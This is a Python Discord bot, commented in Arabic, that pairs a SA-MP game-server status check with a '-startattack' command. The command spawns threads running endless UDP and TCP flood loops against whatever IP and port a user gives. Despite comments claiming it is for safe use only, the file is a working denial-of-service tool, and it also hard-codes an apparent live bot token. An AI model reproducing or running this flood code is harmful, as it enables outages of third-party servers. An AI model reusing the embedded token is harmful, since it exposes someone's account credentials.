import discord
from discord.ext import commands
import socket
import random
import threading

# إعداد البوت
intents = discord.Intents.default()
intents.message_content = True  # تفعيل الوصول لمحتوى الرسائل
bot = commands.Bot(command_prefix="-", intents=intents)

# دالة لفحص حالة السيرفر عبر بروتوكول UDP
def check_samp_status(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(5)  # مهلة الاتصال 5 ثواني
        s.sendto(b'\xFF\xFF\xFF\xFF\x02', (ip, port))  # إرسال استعلام للـ SAMP
        data, addr = s.recvfrom(1024)  # انتظار رد الخادم
        if data:
            return "السيرفر متصل ورد بنجاح!"
        else:
            return "فشل الاتصال بالخادم!"
    except socket.timeout:
        return "فشل الاتصال بالخادم - مهلة!"
    except Exception as e:
        return f"خطأ: {str(e)}"

# الأمر المستخدم في Discord لفحص حالة السيرفر
@bot.command(name="sampstatus")
async def sampstatus(ctx, ip: str, port: int):
    await ctx.send(f"جارٍ فحص حالة السيرفر {ip}:{port}...")
    status = check_samp_status(ip, port)
    await ctx.send(f"نتيجة الفحص: {status}")

# دالة SYN Flood (للاستخدام السليم مع الخوادم المتاحة فقط)
def syn_flood(ip, port):
    data = random._urandom(1024)  # بيانات عشوائية للهجوم
    i = random.choice(("[*]", "[!]", "[#]"))  # اختيار رمز للهجوم
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # إنشاء سوكيت TCP
            s.connect((ip, port))
            s.send(data)
            print(f"{i} craxsrat ynik!!!")
        except:
            print("[*] Error!!!")

# دالة UDP Flood (للاستخدام السليم مع الخوادم المتاحة فقط)
def udp_flood(ip, port):
    data = random._urandom(1024)  # بيانات عشوائية للهجوم
    i = random.choice(("[*]", "[!]", "[#]"))  # اختيار رمز للهجوم
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # إنشاء سوكيت UDP
            addr = (str(ip), int(port))
            s.sendto(data, addr)  # إرسال البيانات
            print(f"{i} UDP Attack Sent!!!")
        except:
            print("[!] Error!!!")

# دالة TCP Flood (للاستخدام السليم مع الخوادم المتاحة فقط)
def tcp_flood(ip, port):
    data = random._urandom(1024)  # بيانات عشوائية للهجوم
    i = random.choice(("[*]", "[!]", "[#]"))  # اختيار رمز للهجوم
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # إنشاء سوكيت TCP
            s.connect((ip, port))
            s.send(data)
            print(f"{i} TCP Attack Sent!!!")
        except:
            print("[*] Error!!!")

# دالة الهجوم باستخدام البوت نت (للاستخدام السليم مع الخوادم المتاحة فقط)
def botnet_attack(ip, port, threads):
    for y in range(threads):  # تنفيذ الهجوم باستخدام الخيوط
        th = threading.Thread(target=syn_flood, args=(ip, port))  # خيط للهجوم عبر SYN
        th.start()
        th = threading.Thread(target=udp_flood, args=(ip, port))  # خيط للهجوم عبر UDP
        th.start()
        th = threading.Thread(target=tcp_flood, args=(ip, port))  # خيط للهجوم عبر TCP
        th.start()

# تنفيذ أمر الهجوم عبر الخيوط
@bot.command(name="startattack")
async def start_attack(ctx, ip: str, port: int, threads: int):
    await ctx.send(f"Starting attack on {ip}:{port} with {threads} threads...")
    botnet_attack(ip, port, threads)

# تشغيل البوت
bot.run('MTM1ODE1MTYzODE4MzA1NTU1MQ.GYU_Lz.Pn0rkx9L9eHCWCrPNNF5jpl_fZIsC2cwvcQNiM')
